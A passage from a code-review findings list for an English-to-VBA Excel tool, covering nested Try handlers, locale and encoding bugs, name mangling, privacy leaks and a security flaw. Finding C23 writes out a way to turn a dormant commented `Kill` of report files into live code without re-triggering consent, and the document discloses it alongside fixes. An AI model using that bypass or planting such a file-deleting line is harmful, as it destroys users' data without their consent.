- Failure scenario: A program says `Work on sheet Salaries.` and clears or anonymises columns before the workbook is emailed. The pre-run `Salaries` sheet stays in the file as very-hidden `VLAu_frazaro_Salaries` until the program runs again, and a program that is never run again keeps it forever. The recipient can recover it with the VBE, Document Inspector, or by unzipping the .xlsx. Separately, `Protect this sheet with password hunter2` with a typo fails Check, so the password is written to `VLA_Log`. The CLI deliberately keeps such lines off disk (`VlaHistoryMayKeepOnDisk`, VLA_Console.bas:407), but the log has no such filter, so two copies of one privacy rule have drifted apart. "Copy Diagnostic Report" then pastes it into an email. There is also no Clear Log button, so a shipped-add-in user cannot remove it. `VLA_LoadedPhrasebooks` also leaks `C:\Users\<name>\...` paths to every recipient, and SEC.9's prompt shows them on open.
- Live repro: Run a program that clears a named sheet, save and close, reopen, and look in the VBE Project Explorer or File > Info > Inspect Document: the `VLAu_*` sheets hold the old data. Mistype a sentence that contains "password", save, and inspect `VLA_Log`.
- Dedupe: Grepped for `very-hidden`, `VLA_Log`, `LogParseFailure`, `Document Inspector`, `snapshot` combined with shar/leak/privacy, and `VLA_LoadedPhrasebooks`. SEC.9 covers these paths as an *attack input*, not as a leak outward. IO.4 is about co-authoring mechanics. Not filed.
- Fix direction: Drop snapshots when the workbook is saved or closed, or ask. At minimum, add a ribbon "Remove Frazaro's hidden sheets" / "Clear feedback log" and a first-save notice. Apply `VlaHistoryMayKeepOnDisk` (or a shared secret-word predicate) before `LogParseFailure` writes. Store phrasebook paths relative to the workbook, or as file names only, when they sit under the user profile.
- Ratchet-able?: Yes for the drift. One shared "may this text be persisted" predicate, plus a check that every persistence site in VLA_IDE and VLA_Console calls it. And a check that every `Public Sub EnglishIde*` is reachable from the ribbon or menu, which would have caught `EnglishIdeClearLog`.

### C19 ✔ — Nested Try: the inner Try restores the step handler instead of the outer Try's handler, and it clears the outer "the problem" flag

*medium · confirmed in code, live effect needs repro · Translator, slice finding 1* · *re-read by the assembling session*

**Related:** C27

- Class: design / error handling (10, 1). Severity: **medium**. Verdict: **CONFIRMED** for the emitted VLA. The runtime effect is PLAUSIBLE (both backends run (on-error goto ...) as written).
- Where: `src/VLA_SentenceEngine.bas:4242-4262` (Case "try"), `:3785-3791` (RestoreHandlerVla), `:4245-4248` (mInRecovery), `:5273` (the use of "problem"). Line 684 says nesting is intended: "so several Trys - nested or sequential - can share a procedure".
- Evidence:
```vba
' Case "try"
If hasRec Then
    mInRecovery = True
    Set elseC = ParseBlock(toks, pos)
    mInRecovery = False          ' not saved/restored: clears an OUTER recovery's flag
...
r = r & pad & "(label vla-tryr-" & tn & ")" & vbCrLf
r = r & pad & RestoreHandlerVla() & vbCrLf
...
r = r & pad & "(label vla-tryd-" & tn & ")" & vbCrLf
r = r & pad & RestoreHandlerVla()

Private Function RestoreHandlerVla() As String
    If mStepTracking Then
        RestoreHandlerVla = "(on-error goto vla-fail)"   ' never "vla-tryf-<outer>"
    Else
        RestoreHandlerVla = "(on-error goto 0)"
```
- Failure scenario: (a) The program is `Try:` / `Try:` / `Set a to 1 divided by 0.` / `If that fails:` / `Log "inner".` / (back in the outer body) `Set b to 1 divided by 0.` / `If that fails:` / `Log "outer".`. When the inner Try exits, it emits `(on-error goto vla-fail)`. The second failure therefore goes to the step reporter, and the program stops with an error report. The outer recovery never runs. With tracking off the handler becomes `(on-error goto 0)`, so the user gets a raw runtime error. (b) Inside an outer `If that fails:` paragraph, an inner Try that has its own recovery sets `mInRecovery = False` when it finishes. After that, `Show the problem.` in the rest of the outer recovery compiles to the plain name `problem` instead of `vla-problem`. That name is not auto-dimmed, so the result is a blank value or a "not defined" failure instead of the error text.
- Live repro: translate the program in (a) with Explain or Translate to VLA. Look for `(on-error goto vla-fail)` after `vla-tryd-2` while still inside the outer body, then run it and confirm "outer" is never logged. For (b), add `Try: Set c to 1 divided by 0. If that fails: Log "x".` inside the outer recovery, follow it with `Log the problem.`, and check the VLA for `problem` versus `vla-problem`.
- Dedupe: searched both roadmaps for RestoreHandlerVla, mInRecovery, vla-tryf, "nested try" and "inner try". Nothing is filed. No test covers nested Try (the only `If that fails` pins are VLA_Tests.bas:830/840/1024).
- Fix direction: keep a stack of enclosing Try handler labels (like mLoopStack). RestoreHandlerVla should emit the innermost enclosing `vla-tryf-N`, or vla-fail/0 at depth 0. Save and restore mInRecovery around the recovery ParseBlock instead of setting it back to False.
- Ratchet-able?: partly. A static rule could flag any module Boolean assigned `= True` then `= False` around a recursive Parse* call with no saved copy. A behavioural pin (a nested-Try golden) is the real guard.

### C20 — `IsNumTok` classifies number tokens with locale-dependent `IsNumeric`, and the same file already contains the invariant classifier

*medium · plausible, needs live repro · Translator, slice finding 2*

**Roadmap link:** Extends EN.4.

**Related:** C34, C5

- Class: numeric/locale (5, 6). House rule INTRINSICS #2. Severity: **medium**. Verdict: **PLAUSIBLE** (depends on the locale).
- Where: `src/VLA_SentenceEngine.bas:3498-3502`. Used at :4140, :4156, :4571 (MatchRefToken), :5171 (ParsePrimCore, the main number path), :5413, :10577 (Define). The file's own invariant twin is at `:6122-6147` (IsInvariantNumeral), whose comment is "VBA's own IsNumeric is locale-dependent and accepts "1e3", so it is not used." There is a third twin at `VLA.bas:3791` (IsNumericLiteralText).
- Evidence:
```vba
Private Function IsNumTok(ByVal t As String) As Boolean
    If Len(t) = 0 Then Exit Function
    If IsStrTok(t) Then Exit Function
    IsNumTok = IsNumeric(t)
End Function
```
- Failure scenario: the tokenizer makes `1.5` a single token (:3316). Whether `Set x to 1.5.` translates then depends on the Windows locale. Where "." is neither the decimal nor the group separator (fr-FR style), `IsNumeric("1.5")` is False. The token is also not a word token (it starts with a digit), so the sentence gets a wrong refusal ("expected a value"). The rule also accepts, on every locale, tokens that no backend reads the same way. `Set x to 5-.` gives token `5-`, which `IsNumeric` accepts (trailing sign). The translator emits `(set! x 5-)`. The interpreter's `IsNumeric/CDbl` reads that as -5, while compiled VBA `x = 5-` is a syntax error. `1d3` and `1e3` also pass as "numbers".
- Live repro: set Windows Region to French (France), then Check `Set x to 1.5. Show x.` Next, on en-US, check `Set x to 5-. Show x.` on both backends.
- Dedupe: EN.4 ("decimal and thousands separators in the reader") is open and is the umbrella, so this **extends EN.4**. The site itself (IsNumTok) is named nowhere in either roadmap. BETA_REARVIEW ~L11748 flags IsNumeric in VLA.bas FormulaQuote, not here.
- Fix direction: set `IsNumTok = IsInvariantNumeral(t)`, which the tokenizer's own number shape already satisfies (digits, one ".", leading "-"). Then fold the three twin classifiers (IsInvariantNumeral, VLA.IsNumericLiteralText, VLA_Relation.IsInvariantNumericString) into one.
- Ratchet-able?: yes. `check_translate_purity.ps1` (or a new check) could ban `IsNumeric(`, `CDbl(`, `CStr(` and `LCase$`/`UCase$` in the translate-path modules, with a reviewed allow-list. Today no tools/check_*.ps1 greps for any of them (verified), even though R6 (REBUILD.md:151) says "a lint can now grep for zero hits".

### C21 — Pattern literals and keyword-alias surfaces are never checked against the tokenizer's alphabet, so a rule can load and still never be able to match

*medium · confirmed by reading · Translator, slice finding 3*

- Class: design / phrase-rule edge cases (10). Severity: **medium**. Verdict: **CONFIRMED**.
- Where: `src/VLA_SentenceEngine.bas:1499-1518` (AddPhraseRule), `:2368-2430` (ValidateRuleItems), `:3443-3445` (IsWordChar), `:3394-3401` (the unknown-character refusal). Also `src/VLA_English.bas:259-266` (RegisterKeywordAlias).
- Evidence:
```vba
' AddPhraseRule: every space-separated piece becomes a literal item as-is
w = VLA_Identity.Fold(Trim$(parts(i)))
If Len(w) > 0 Then
    If Not IsNoiseWord(w) Then items.Add NumberWord(w)
...
Private Function IsWordChar(ByVal c As String) As Boolean
    IsWordChar = (c Like "[A-Za-z0-9_-]")     ' input side: ASCII only
```
- Failure scenario: the tokenizer can never produce these tokens: a word with an accented letter (`répéter`, `año`, `größe`, which are refused with "I don't understand the character é"), a literal with a trailing period (`stop.`, since "." is always split off), a quoted literal (`"hello"`, because string tokens carry only a leading Chr(34)), `1,000` (it becomes `1000`), and anything containing `'`, `+`, `=` or `%`. A pattern or `(keyword-alias "sí" "if")` that uses one of them registers without complaint and is dead. ValidateRuleItems checks slots and alternations only. LintRule/AuditCrossRuleShadow either say nothing or blame an unrelated earlier rule, because the synthesized sentence cannot reach the dead rule. The polyglot files already work around this by hand: `espanol.vla` writes `Envia` and `espanol` without accents, and no .vla under scripts/polyglotta has a non-ASCII letter. Separately, LX.6's ratified policy ("an accented word is still the user's word … transliterate rather than refusing") cannot be reached from English input, because EnTokenize refuses `é` before SymName ever sees it.
- Live repro: load a phrasebook with `(english-vla "répéter {e:expr}" (debug-print {e}))` and no test. It loads. Then check `Répéter 5.` and you get the unknown-character refusal. Also load `(english-vla "stop now." (exit-sub))` and check `Stop now.`
- Dedupe: searched for "never match", "unreachable", "dead rule", "trailing period", "accent" and IsWordChar in both roadmaps. The only hits are LX.6 (VLA-side SymName, marked ✅), which this finding shows is unreachable from English. Not filed.
- Fix direction: at registration, run each literal/alias surface through the same character test the tokenizer uses (IsWordChar plus the glued `.`/`,`/`:`/`!` shapes) and refuse in words, naming the character, the way the input side does. Separately, decide whether IsWordChar should accept Latin-1/Latin-Ext-A letters (LX.6's own range) and fold them.
- Ratchet-able?: as a load-time refusal, yes (it becomes self-enforcing). No static script needed.

### C22 — A template slot name that is not in the pattern survives into the output as the literal text `{name}`

*medium · confirmed by reading · Translator, slice finding 4*

- Class: phrase-rule matching / template expansion (10). Severity: **medium**. Verdict: **CONFIRMED**.
- Where: `src/VLA_SentenceEngine.bas:1506` (pattern slots are Fold-ed), `:1705-1731` (FormSubstitute), `:1744-1762` (BoundLookup's fall-through), `:1795-1822` (EmbeddedSlotText, same fall-through). AddPhraseRule/TemplateForms never cross-check template slots against pattern slots.
- Evidence:
```vba
' BoundLookup - binary "=" against the Fold-ed pattern slot names
For k = 1 To bn.Count
    If CStr(bn.Item(k)) = slotName Then ...
Next
outVal = "{" & slotName & "}"        ' unbound: kept verbatim, no refusal
```
- Failure scenario: `(english-vla "set {Total:var} to {e:expr}" (set! {Total} {e}))`. The pattern slot is folded to `total` and the template keeps `{Total}`, so every match emits `(set! {Total} 5)`. The same thing happens for any typo (`{ex}` for `{e}`). The error surfaces later as a confusing reader/VBA failure, or not at all if the brace atom ends up inside a string (`"Hello {nmae}"` renders literally). The reverse case is also unchecked: a pattern slot the template never uses silently discards the words the user wrote. A test-success proof catches this only if the author wrote one for that exact rule.
- Live repro: Explain `Set total to 5.` after loading the rule above and read the VLA line.
- Dedupe: searched both roadmaps for "undeclared slot", "unbound slot" and "template … slot". The only hit (BETA_REARVIEW ~L21242) concerns VLA_Messages slots (check_message_slots.ps1), not phrase templates. Not filed.
- Fix direction: in AddPhraseRule, collect the template's `{x}`/embedded slot names (Fold-ed) and refuse any name not bound by the pattern, including the generated `-rules`/`-engine` companions. Lint-warn on pattern slots that the template never uses. Fold slot names on both sides.
- Ratchet-able?: a load-time refusal closes the class. `check_message_slots.ps1` is the model for an offline twin over `scripts/**/*.vla`.

### C23 — `raw` consent is keyed by a whitespace-blind hash, but whitespace is semantic in the VBA that `raw` injects

*medium · confirmed by reading · Translator, slice finding 5*

- Class: security (7). Severity: **medium** (SEC area. The attacker needs to edit a file the user already consented to. There is no new entry point). Verdict: **CONFIRMED** by reading. The live repro follows.
- Where: `src/VLA_SentenceEngine.bas:7658-7686` (consent gate), `:7798-7813` (EnglishSourceHash), `src/VLA_Digest.bas:~313` (skips bytes 9/10/13/32), `VLA.bas:4449-4450` (raw emits StrLitContent verbatim). VLA strings may span lines (`VLA.bas:1941-1965`).
- Evidence:
```vba
' VLA_Digest.VlaSha256HexSkippingWhitespace
If b(i) <> 9 And b(i) <> 10 And b(i) <> 13 And b(i) <> 32 Then ...
' VLA.bas EmitStmt
Case "raw"
    r = pad & StrLitContent(Nth(lst, 2)) & vbCrLf
```
- Failure scenario: the user reviews and consents to a phrasebook whose raw text is `x = 1 ' Kill ""C:\Reports\*.xlsx""`. The Kill is dormant because it sits in a VBA comment. Someone later swaps the single space before `Kill` for a line break. The file now emits `x = 1 '` followed by a live `Kill` line. The stripped byte stream is identical, so the device- or workbook-scope grant still matches and there is no prompt. VBA's ` _` continuation gives the same trick: `' note _` followed by a newline and code. SEC.11's rationale ("skipping whitespace costs nothing, since an attacker was always free to vary the non-whitespace bytes") only covers an attacker who authored the file before consent. It does not cover one who alters a file after consent. There is also a smaller read-twice window: the consented hash comes from a second read of the file (EnglishSourceHash), not from the `text` that is actually loaded (:7641).
- Live repro: create a raw-bearing phrasebook with the commented Kill aimed at a scratch folder, grant device consent, change the space to a newline, then reload. There is no dialog, and the Kill runs on the next call.
- Dedupe: SEC.11 (✅) chose the whitespace-stripped stream deliberately, and SEC.10 (open) is about workbook-scope storage. This is a new consequence of SEC.11's decision, not SEC.10.
- Fix direction: hash the `raw` payloads with whitespace intact (for example, whitespace-stripped outside string literals and exact inside them), or normalise only CRLF to LF. Hash the same `text` buffer that gets loaded.
- Ratchet-able?: a pure pin could hash two files that differ only by a space-to-LF change inside a raw string and assert that the hashes differ.

### C24 — Phrasebook directive arity is unchecked (except `at-row`), so a short directive raises a raw runtime error with no file or line

*medium · confirmed by reading · Translator, slice finding 6*

- Class: error handling / SD-2, SD-5 (1). Severity: **medium**. Verdict: **CONFIRMED**.
- Where: `src/VLA_SentenceEngine.bas:8020-8089` (DispatchVocabForm). Only `at-row` has an arity refusal (:8011).
- Evidence:
```vba
ElseIf head = "test-fail" Then
    tfFragment = StripQuoteSigil(CStr(flc.Item(3)))        ' no Count check
...
ElseIf head = "keyword-alias" Then
    RegisterKeywordAlias StripQuoteSigil(CStr(flc.Item(2))), StripQuoteSigil(CStr(flc.Item(3)))
...
ElseIf Len(head) > 4 And Right$(head, 4) = "-vla" Then
    AddPhraseRule StripQuoteSigil(CStr(flc.Item(2))), JoinFormsText(flc, 3)
```
- Failure scenario: `(test-fail "Stop.")`, `(keyword-alias "si")`, `(english-function "area of")` or a bare `(english-vla)` each raise VBA error 5 ("Invalid procedure call or argument") straight out of `Collection.Item`. `(english-vla (x) ...)` raises error 13 from `CStr(Collection)`. The phrasebook load fails with VBA's own text and no file or line, even though ProvLoc is available two lines away. Related: RegisterKeywordAlias's header says the canonical word "must be one of the closed set", but nothing enforces that. `(keyword-alias "si" "iff")` loads, and every `si` then fails to parse, with a message about `iff`.
- Live repro: Load Phrasebook with a file containing only `(test-fail "Stop.")`.
- Dedupe: `check_raise_ratchet.ps1` counts explicit Err.Raise sites only and cannot see implicit runtime errors. Searched for "arity" in both roadmaps: only at-row and Prolog/Datalog items. Not filed.
- Fix direction: one `RequireDirectiveArity head, flc, min, max, loc` helper at the top of each arm that raises a catalogue id with ProvLoc. Validate the keyword-alias canonical word against the closed set.
- Ratchet-able?: yes. A static check could require every `flc.Item(n)` inside DispatchVocabForm to be dominated by an arity call in the same arm.

### C25 — EnglishResolveCheck does not skip `;` comments, and raw VLA rows carry their comments into the output

*medium · confirmed by reading · Translator, slice finding 7*

- Class: correctness / wrong refusal (10). Severity: **medium**. Verdict: **CONFIRMED** (both halves read).
- Where: `src/VLA_SentenceEngine.bas:9492-9618` (scanner: string literals are handled, `;` is not). `:3239-3245` (EnTokenize copies `;...` comments into a raw form's token). `:3862-3869` (ParseStmt emits that token verbatim). The caller is `VLA_IDE.bas:2589`.
- Evidence:
```vba
' EnTokenize, raw-form capture
ElseIf c = ";" Then
    Do While i <= n
        ...
        vForm = vForm & c        ' comment kept inside the form text
' EnglishResolveCheck: only inLit / """" / "(" branches - no ";" branch
ElseIf c = "(" Then ... head = Mid$(vlaText, j, h - j) ...
    ElseIf Left$(keyName, 3) = "vla" Then
        If InStr(defined, ...) = 0 And InStr(manifest, ...) = 0 Then
            EnglishResolveCheck = head        ' refusal
```
- Failure scenario: a raw row `(if (> x 1)   ; was (vla-old-helper x)` followed by `(then (msgbox "big")))`. Check refuses with "this program needs a helper named 'vla-old-helper' that this Frazaro doesn't provide". That is wrong, because the name is only mentioned in a comment. It fails the other way too (fail-open): an odd number of `"` in a comment flips `inLit`, so the rest of the program is treated as string and a real missing helper passes the check.
- Live repro: put the two-line raw row above in an instruction cell and click Check.
- Dedupe: EnglishResolveCheck appears in BETA_REARVIEW L3930/3937/5567 and BETA_ROADMAP F.16 only as a mechanism, with no comment bug. Tests (VLA_Tests.bas:5467-5483) cover string literals, not comments. Not filed.
- Fix direction: add a `;`-to-end-of-line branch outside literals (the same one VocabTextHasRawForm :8344 already has), or scan the reader's forms instead of raw text.
- Ratchet-able?: the class is "hand-rolled VLA text scanners that miss a lexical case". There are at least three in this file (EnglishResolveCheck, VocabTextHasRawForm, EnTokenize's raw capture), and one handles `;` while another does not. Converging on one shared lexer is the fix. A pin covering comment plus odd quote would hold it.

### C26 — The UTF-8 read silently becomes ANSI decoding in the fallback (and the reverse case silently inserts U+FFFD), even though a strict decoder already exists

*medium · plausible, needs live repro · Translator, slice finding 8*

**Related:** C31, C32

- Class: robustness / silent data change (8, 10). Severity: **medium**. Verdict: **PLAUSIBLE** (needs a host without ADODB, or an ANSI-saved file).
- Where: `src/VLA_SentenceEngine.bas:9795-9830` (VocabReadFile, used for phrasebooks :7641 and for program files :10386/:10507/:10551). Its twin is `VLA_Loader.bas:128-155` (ReadTextFile). The unused strict decoder is `VLA_Loader.VlaUtf8Decode` (:362, which reports `badAt`).
- Evidence:
```vba
ansiFallback:
    ...
    Open filePath For Binary Access Read As #f
    ...
    VocabReadFile = StrConv(b, vbUnicode)     ' system code page, no validation
```
- Failure scenario: (a) With no ADODB (Mac, where EN.6 says the default runtime now runs, or a locked-down Windows image), `CreateObject` fails, so the fallback decodes a UTF-8 program as cp1252/MacRoman. `Show "Café"` then writes `CafÃ©` into the workbook with no error. A UTF-8 BOM becomes `ï»¿`, and the tokenizer refuses line 1 with "I don't understand the character ï". (b) With ADODB present, a legacy ANSI-saved file containing `é` "succeeds" as UTF-8 with U+FFFD in place of the byte, which is also silent. U.20/TER-6 made every writer byte-honest. The readers are still lossy.
- Live repro: (a) on Windows, temporarily make CreateObject fail (for example, rename the ProgID in a scratch copy, or test on Mac Excel) and translate a program containing `"Café"`. (b) Save a program as ANSI in Notepad with `"Café"` and run Translate to VLA, then inspect the output.
- Dedupe: U.20, TER-5 and TER-6 are all about writers. VocabReadFile is mentioned only at BETA_REARVIEW L10659 (the purity audit). Searched StrConv, mojibake and "ANSI" in BETA_ROADMAP. Not filed.
- Fix direction: read bytes once (VlaReadFileBytes), strip a BOM, decode with VlaUtf8Decode, and refuse in words with the byte offset when `badAt` is set. Delete both ANSI fallbacks and the cached `mVocabStream`.
- Ratchet-able?: yes. Ban `StrConv(` with `vbUnicode` and `ADODB.Stream` reads outside one sanctioned reader.

### C27 — `Show all rows.` (and any macro ending in `(on-error goto 0)`) switches off the step handler for the rest of the procedure, and switches off an enclosing Try

*medium · confirmed by reading · Reader and emitter, slice finding 2*

**Related:** C19, C35

- Class: 1 (error-handler flow; related to TER-11 but a different mechanism) / **Severity: medium** (raw VBE error with a Debug button; Try stops catching) / Verdict: CONFIRMED in the committed golden.
- Where: `scripts/polyglotta/english.vla:3816-3819` (`show-all-rows`, used by rules at 645, 648, 2988, 2991, 2994). It appears in the emitted code at `scripts/instructions_golden.vba:1974-1976, 3316-3318, 3334-3336, 3352-3354, 3375-3377, 3399-3401`. The same shape exists for nested Try: `src/VLA_SentenceEngine.bas:4221-4262` with `RestoreHandlerVla` (3785) always restores `vla-fail`/`0`, never the handler that was active before.
- Evidence (golden, inside `Public Sub main()`, whose handler is `On Error GoTo vla_fail`):
```vba
    On Error Resume Next
    Call activesheet.showalldata
    On Error GoTo 0            ' <- vla_fail is now disarmed for the rest of main
    vla_step = 348 ' vla:1565
```
  In the golden, main runs steps 348-358 and roughly 593-687 with no handler at all. The next `On Error GoTo vla_fail` is only re-issued by a later Try's restore (golden:2049).
- Failure scenario: (a) Any sentence that fails after `Show all rows.` in a compiled program shows VBA's raw "Run-time error 1004" dialog with **Debug**/**End**, instead of `vla_report_error`'s worded step report. `VlaStopReport` (U.25) records nothing. If the person presses End, VBA state resets and the Run button's own clean-up after `Application.Run` never runs. (b) `Try:` / `Show all rows.` / `Delete sheet Old.` / `If that fails: ...`: the delete failure is **not** caught by the Try on either backend. The interpreter mirrors this too: `ExecOnError` sets `mErrMode = ""` (Interpreter:827). (c) Nested Try: after an inner Try completes, the outer Try's handler is replaced by `vla_fail`, so later failures in the outer body stop the run instead of reaching the outer recovery paragraph. The comment at SentenceEngine:684 claims nested Trys are supported.
- Live repro: compile a program with `Show all rows.` followed by `Put 1 into cell A1 of sheet Nope.` and press Run. Expected: a worded stop at that step. Predicted: raw VBE error dialog.
- Dedupe: searched for `showalldata`, `show-all-rows`, "goto 0", "nested try". Only CO.7 wording notes (BETA_REARVIEW:7299/7312) came up, nothing about the handler. The prelude's own comment (prelude.vla:169-173) documents the physics for `try-else`/`with-fast-excel`, but no shipped English rule is supposed to hit it, and `show-all-rows` does. TER-11 is a different mechanism (a sub's handler returning).
- Fix direction: have the English layer emit `RestoreHandlerVla()` after any statement whose expansion contains `on-error`. Or move the probe into a `VLA_Runtime` helper, `VlaShowAllData`, which uses On Error inside its own procedure. That is the pattern `MakeButtonHelperText` already uses (VLA.bas:5768 comment). For nested Try, restore to the enclosing Try's `vla-tryf-N` when there is one, using a stack in the parser.
- Ratchet-able?: Yes. Scan the committed golden `.vba`: inside any procedure containing `On Error GoTo vla_fail`, every `On Error GoTo 0` / `On Error Resume Next` must be followed by `On Error GoTo vla_fail|vla_tryf_N` before the next `vla_step =` line. That would have caught all 6 golden instances.

### C28 — The emitter's name mangling is not one-to-one, and it can mangle a legal English name into a VBA reserved word

*medium · confirmed in code, live effect needs repro · Reader and emitter, slice finding 4*

- Class: 10/6 / **Severity: medium** (Interpret works; Compile/export fails with an untrappable compile modal, or two names silently merge) / Verdict: CONFIRMED for the mapping. PLAUSIBLE for which VBA error appears.
- Where: `src/VLA.bas:5712-5727` (`SymName`), `5688-5700` (`TransliterateToAscii` drops unmapped characters), and `src/VLA_SentenceEngine.bas:7433-7445` (`IsReservedName`/`CheckName` run on the **pre-mangle** name).
- Evidence:
```vba
r = Replace(Replace(TransliterateToAscii(s), "-", "_"), ":", "_")
' TransliterateToAscii: buf = buf & TransliterateChar(c)  ' "" when no mapping exists - dropped
```
- Failure scenarios: (a) `Create a number called résumé.` passes `CheckName`, because "résumé" is not in the list, and is then emitted as `Dim resume As Double`. `Resume` is a VBA keyword, so this is a compile error. The same happens with `dáte`, `nëxt`, `sélect`, `énd`. (b) `x²`/`x₁` and `x` fold to the same `x`, and so do `café` and `cafe`, and `row-count` and `row_count`. The interpreter keeps them distinct: `VLA_Identity.Fold` only lower-cases A-Z (VLA_Identity.bas:46). VBA sees one name: a duplicate declaration, or a local silently shadowing a module-level `Const` or `Dim`. (c) `Émile` and `émile` are two names to the interpreter, because Fold is ASCII-only. After transliteration they are `Emile`/`emile`, which is one name to case-insensitive VBA. (d) `IsReservedName`'s list itself is missing real VBA keywords: `return`, `gosub`, `global`, `addressof`, `decimal`, `longlong`, `longptr`, `attribute`. `Create a number called return.` (an investment "return") is refused by nothing. (e) The emitter's own names (`vla_step`, `vla_problem`, `vla_fail`, `vla_report_error`, `vla_step_text`, `vla_tco_N`, `vlaSlab*`) are not refused as user names. `RefuseGeneratedPrefix` covers relations only.
- Live repro: `Create a number called résumé.` / `Set résumé to 1.` Interpret works. Compile shows "Expected: identifier" (or similar) in the VBE.
- Dedupe: LX.6 (BETA_REARVIEW:4013) decided to transliterate but says nothing about collisions or reserved words. `IsReservedName` appears only in LX.1 ("keep"). The click-handler slug already has this exact collision guard (`english-click-handler-slug-collision`, SentenceEngine:634-660), which shows the class is known but only closed for one path.
- Fix direction: give SymName (or a per-transpile registry) a "mangled name → first raw name" map that refuses a second, different raw name with the same mangled form. Run the reserved-word check **after** mangling, in the emitter, against one authoritative list (MS-VBAL keywords plus the emitter's reserved prefix `vla_`).
- Ratchet-able?: partly. A static check can require that `IsReservedName`'s list is a superset of a checked-in MS-VBAL keyword file. Injectivity needs the runtime registry.

### C29 — Optional parameter defaults may be any expression, but VBA needs a constant

*medium · confirmed by reading · Reader and emitter, slice finding 5*

- Class: 10 (backend divergence) / **Severity: medium** / Verdict: CONFIRMED by reading.
- Where: `src/VLA_SentenceEngine.bas:1039-1052, 1112-1131` (`pDef = ParseExprReq(...)`, so any expression). `src/VLA.bas:4283-4285` (`EmitParams`, which emits `= EmitExpr(default)`). `src/VLA_Interpreter.bas:3693-3715` (evaluates the default at call time, in the callee frame).
- Evidence:
```vba
' VLA.bas:4283
Case "optional"
    one = "Optional " & SymName(...) & " As " & SymName(...)
    If pl.Count >= 4 Then one = one & " = " & EmitExpr(Nth(pl, 4))
```
  The golden shows the constant case working (`Optional rate As Variant = (5 / 100)`, golden:59).
- Failure scenario: `To stamp, with row-number of last-row:`, or `with start of cell A1`, or `with b of a` (a default that names an earlier parameter). Check is green and Interpret evaluates the default. Compile emits `Optional row_number As Variant = last_row`, and VBA refuses with "Constant expression required": an untrappable compile modal on Run/export.
- Live repro: the sentence above with `last-row` defined as a variable, then Compile.
- Dedupe: nothing for "Constant expression required", "optional default", or "BindPositionalArgs".
- Fix direction: in `EmitParams`, accept only literals, `Const` names and operators over them (a small recursive "is-constant-expression" predicate), and refuse others in words. Or have the English layer refuse non-literal defaults at Check.
- Ratchet-able?: a pure test over the phrasebook's parameter-default shapes. Not a text scan.

### C30 — String literals are copied into VBA source without line-break or line-length safety

*medium · confirmed in code, live effect needs repro · Reader and emitter, slice finding 6*

- Class: 10/7 / **Severity: medium** / Verdict: CONFIRMED for the line break (reader and emitter). PLAUSIBLE for the 1023-character limit.
- Where: `src/VLA.bas:1936-1964` (`Tokenize` keeps raw LF/CR inside `"..."`), `src/VLA.bas:5787-5791` (`ToVbaString`), and the `vla_step_text` generator, which embeds every sentence verbatim (golden:3861ff).
- Evidence:
```vba
Private Function ToVbaString(ByVal tok As String) As String
    c = Mid$(tok, 2)
    ToVbaString = """" & Replace(c, """", """""") & """"   ' no vbLf/vbCr handling, no splitting
```
- Failure scenario: (a) The VLA source `(debug-print "a` / `b")`, legal to the reader and fine in the interpreter, emits a VBA string literal spanning two physical lines, which is a syntax error. `MapTag` (VLA.bas:4275) then inserts `' vla:N` *inside* the string at the first vbCrLf. (b) A sentence or formula longer than about 1000 characters (Excel formulas can be up to 8192) produces an emitted line past the VBE's 1023-character physical line limit, both in the statement and again in `vla_step_text`. The roadmap (BETA_REARVIEW:16702) records that limit biting Frazaro's own source, but the emitter has no guard.
- Live repro: `Put formula "=<1100-character formula>" into cell A1.`, then Compile.
- Dedupe: searched for "multi-line string", "ToVbaString", "1023". Only the VLA_Messages source-line instance came up.
- Fix direction: in `ToVbaString`, emit `" & vbLf & "` for LF, `vbCr` for CR, and `ChrW(n)` for code points outside ASCII (this also fixes the ANSI-code-page `?` loss the roadmap notes at BETA_REARVIEW:7018). Split any piece over about 900 characters into `"..." & _` continuations, or into several `s = s & ...` statements.
- Ratchet-able?: yes. A check over the golden `.vba` can assert that no physical line exceeds 1023 characters and that no line has an unbalanced quote count.

### C31 — `(include "…")` files are read as ANSI, resolved against ActiveWorkbook, and a UTF-8 BOM breaks them

*medium · confirmed by reading · Reader and emitter, slice finding 7*

**Related:** C26, C32

- Class: 3/6 / **Severity: medium** (silent text corruption, or a wrong refusal) / Verdict: CONFIRMED by reading.
- Where: `src/VLA.bas:2165-2185` (`ReadIncludeFile`).
- Evidence:
```vba
path = ActiveWorkbook.path & Application.PathSeparator & name
Dim fnum As Integer
Open path For Input As #fnum
If LOF(fnum) > 0 Then ReadIncludeFile = Input$(LOF(fnum), #fnum)
```
- Failure scenario: every other `.vla` reader decodes UTF-8 (`VlaReadFile`; see the TER-6 note at SentenceEngine:10440). An included UTF-8 file containing `"café"` puts `cafÃ©` into cells, silently. If the include was saved with a BOM (Notepad), the first three characters `ï»¿` become a bare symbol token before the first `(`, and the whole program is refused as "top-level not a list". Relative includes resolve against whichever workbook is **active**, not against the including file's folder, so nested `lib/a.vla` → `(include "b.vla")` misses. On a DBCS code page, `Input$(LOF)` counts characters against a byte length and can raise error 62.
- Live repro: save `inc.vla` as UTF-8 with a BOM containing `(sub helper () (debug-print "café"))`, and `(include "inc.vla")` it from a program.
- Dedupe: searched for `ReadIncludeFile`, "include.*UTF-8/ANSI/BOM". The only hit (BETA_REARVIEW:2909) is F.3's design note. EN.9 covers OneDrive `.Path` generally, not the encoding.
- Fix direction: read through `VLA_Loader.VlaReadFileBytes` plus `VlaUtf8Decode` (strict, with the BOM stripped, as Lint does at VLA_Lint.bas:835-838), and resolve relative to the including file's directory. That directory is already known as `label` in `SpliceWalk`.
- Ratchet-able?: yes. A grep ratchet for `Open .* For Input` on `.vla` sources outside `VLA_Loader`.

### C32 — `ReadTextFile`'s "ANSI fallback" never runs for badly encoded text, so ANSI programs import with U+FFFD

*medium · plausible, needs live repro · Reader and emitter, slice finding 8*

**Related:** C26, C31

- Class: 1/6 / **Severity: medium** (silent change to the user's program) / Verdict: PLAUSIBLE. It depends on ADODB behaviour: its UTF-8 charset substitutes, it does not raise.
- Where: `src/VLA_Loader.bas:128-154`. It is used by `VlaReadFile`, which `VLA_IDE.ImportFromPath` (VLA_IDE.bas:4518) uses to pour a `.txt` program onto the sheet, and also by the prelude and embedding readers.
- Evidence:
```vba
On Error GoTo ansiFallback
st.Charset = "utf-8"
st.LoadFromFile filePath
ReadTextFile = st.ReadText(-1)   ' invalid UTF-8 bytes -> U+FFFD, no error raised
```
